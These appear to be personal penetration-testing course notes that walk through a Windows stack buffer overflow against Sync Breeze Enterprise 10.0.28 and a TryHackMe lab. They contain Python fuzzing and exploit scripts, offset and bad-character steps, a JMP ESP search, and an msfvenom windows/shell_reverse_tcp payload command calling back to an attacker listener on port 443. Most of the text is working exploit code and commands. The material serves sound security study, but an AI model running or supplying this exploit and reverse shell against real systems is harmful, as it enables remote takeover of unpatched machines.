# Module 11 (Widows Buffer OverFlow)

## Discovering The Vulnerability

* **Source Code Review**
  * **(is likely the easiest if it is available)**
* **Reverse engineering techniqes**
* **Fuzzing**



* **Fuzzing the HTTP Protocol**

<figure><img src="../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

## [Sync Breeze Enterprise 10.0.28](https://www.exploit-db.com/exploits/42928)

## make req using Wireshark

{% code overflow="wrap" %}
```
POST /login HTTP/1.1
Host: 192.168.1.5
Connection: keep-alive
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.5
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Referer: http://192.168.1.5/login
Accept-Encoding: gzip, deflate
dnt: 1

username=asd&password=1234
```
{% endcode %}

i'll try make request using SOCKT

```python
#!/usr/bin/python3
import socket
import time
import sys

c = 100
while c < 2000:
    try:
        print(f"\nSending evil buffer with {c} bytes")
        inputBuffer = "A" * c
        payload = f"username={inputBuffer}&password=A"
        
        req = (
            "POST /login HTTP/1.1\r\n"
            "Host: 192.168.1.5\r\n"
            "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            "Accept-Language: en-US,en;q=0.5\r\n"
            "Referer: http://192.168.1.5/login\r\n"
            "Connection: close\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(payload)}\r\n"
            "\r\n"
            f"{payload}"
        )

        print(req)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.5", 80))
        s.sendall(req.encode())
        response = s.recv(1024)
        print(response.decode())
        s.close()
        c += 100
        time.sleep(5)
    except Exception as e:
        print(f"Fuzzing crashed at {c} bytes")
        print(f"Error: {e}")
        sys.exit()

```



<figure><img src="../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Fuzzing crashed at 800 bytes
{% endhint %}

### msf-pattern\_create

```
msf-pattern_create -l 800
```

<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>



```
msf-pattern_offset -l 800 -q  <number of EIP>
```

<figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption><p>oFFSET </p></figcaption></figure>

```python
#!/usr/bin/python
import socket

inputBuffer ="A"*780+'BBBB'+'C'*(800-780-4)

payload = "username=" + inputBuffer + "&password=A"
req=""
req = "POST /login HTTP/1.1\r\n"
req += "Host: 192.168.1.5\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Referer: http://192.168.1.5/login\r\n"
req += "Connection: close\r\n"
req += "Content-Type: application/x-www-form-urlencoded\r\n"
req += "Content-Length: "+str(len(payload))+"\r\n"
req += "\r\n"
req += payload

print req
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.5", 80))
s.send(req)
print s.recv(1024)
s.close()
```

<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

add + 800 => inputBuffer ="A"\*780+'BBBB'+'C'\*(<mark style="color:red;">1500</mark>-780-4)

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

C = 2C4 =708

Badchar form 1 byte to (0xff)

### **Generat BadChar from 1 to 0xff**

{% code overflow="wrap" %}
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
                                                            
```
{% endcode %}

### Add badchar in exploit code&#x20;

```python
#!/usr/bin/python
import socket
badchar = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
"\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
"\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
"\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
"\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
"\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
"\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
"\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

inputBuffer ="A"*780+'BBBB'+badchar+'C'*(1500-len(badchar)-780-4)

payload = "username=" + inputBuffer + "&password=A"
req=""
req = "POST /login HTTP/1.1\r\n"
req += "Host: 192.168.1.5\r\n"
req += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Referer: http://192.168.1.5/login\r\n"
req += "Connection: close\r\n"
req += "Content-Type: application/x-www-form-urlencoded\r\n"
req += "Content-Length: "+str(len(payload))+"\r\n"
req += "\r\n"
req += payload

print req
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.5", 80))
s.send(req)
print s.recv(1024)
s.close()

```

**Run exploit with attach The Service**

<mark style="color:red;">**Follow Dump ESP**</mark>

EX:-

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Repeat the same steps
{% endhint %}

{% hint style="danger" %}


badchar make terminit your Shellcode

```
#\x00\0xa\0xd\x25\x26\x3d
```
{% endhint %}

After Remove Badchar

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



Jmp esp

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

find the dll with out badchar

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```
!mona find -s "\xff\xe4" -m "libspp.dll"
```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>10090C83</p></figcaption></figure>

convert address to latial indin = 0x10090C83

```bash
"\x00\x0a\x0d\x25\x26\x2b\x3d"
```

### Generate payload (x86/shikata\_ga\_nai )

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.8 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -e x86/shikata_ga_nai -f c

```

Revers shell&#x20;

```bash
sudo nc -nvlp 443
```

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>FULL Exploit</p></figcaption></figure>

### I Will use lab in THM[ Buffer Overflow Prep](https://tryhackme.com/r/room/bufferoverflowprep)

### STEPS

* FUZZING
* Crash Replication & Controlling EIP
*



### FUZZING

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.X.X"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```



<figure><img src="../.gitbook/assets/image (146).png" alt=""><figcaption><p>python3 fuzzer.py<br>crached in 2000 </p></figcaption></figure>

### Crash Replication & Controlling EIP

```python
import socket

ip = "10.10.x.x"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

in msfconsole

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <Crached number byte>
```



<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption><p>2000 Byte</p></figcaption></figure>

{% code overflow="wrap" %}
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
```
{% endcode %}

Get number of OFFSET

{% code overflow="wrap" %}
```
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 2000 -q 6F43396E
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

